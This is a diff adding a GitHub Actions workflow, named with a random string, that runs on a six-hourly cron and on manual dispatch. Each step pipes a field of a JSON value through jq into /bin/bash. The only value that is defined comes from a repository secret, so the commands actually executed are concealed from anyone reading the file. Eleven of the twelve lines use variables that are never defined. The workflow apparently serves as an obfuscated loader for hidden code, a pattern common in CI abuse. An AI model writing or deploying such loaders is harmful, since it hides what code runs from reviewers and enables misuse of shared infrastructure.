@@ -1,0 +1,29 @@
+name: xueqianxunx
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xueqianxunx
+        env:
+          piw2: ${{ secrets.piw2 }}
+        run: |
+          echo $piw2 | jq -r .nrwev037 | /bin/bash
+          echo $r4 | jq -r .hcbic1950 | /bin/bash
+          echo $cbz04921 | jq -r .su8 | /bin/bash
+          echo $xm0869 | jq -r .d10095 | /bin/bash
+          echo $z12 | jq -r .inwe172 | /bin/bash
+          echo $gmf1545 | jq -r .tl23 | /bin/bash
+          echo $skqu1658 | jq -r .d5 | /bin/bash
+          echo $lfm69 | jq -r .g33 | /bin/bash
+          echo $c13826 | jq -r .pvl367 | /bin/bash
+          echo $updy2 | jq -r .dstvh6 | /bin/bash
+          echo $trccx69800 | jq -r .el52 | /bin/bash
+          echo $wepw02465 | jq -r .voo8 | /bin/bash
+
